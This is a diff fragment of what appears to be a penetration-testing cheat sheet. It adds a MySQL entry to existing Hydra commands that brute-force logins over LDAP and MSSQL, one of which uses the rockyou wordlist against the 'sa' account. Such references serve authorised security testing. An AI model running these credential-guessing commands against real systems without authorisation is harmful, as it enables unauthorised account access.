@@ -66,3 +66,8 @@ hydra -L users.txt -P passwords.txt target.com ldap2 -s 389
 hydra -L users.txt -P passwords.txt <IP> mssql
 hydra -l sa -P /usr/share/wordlists/rockyou.txt target.com mssql
 ```
+
+#### MySQL
+```
+hydra -L users.txt -P passwords.txt <IP> mysql
+```
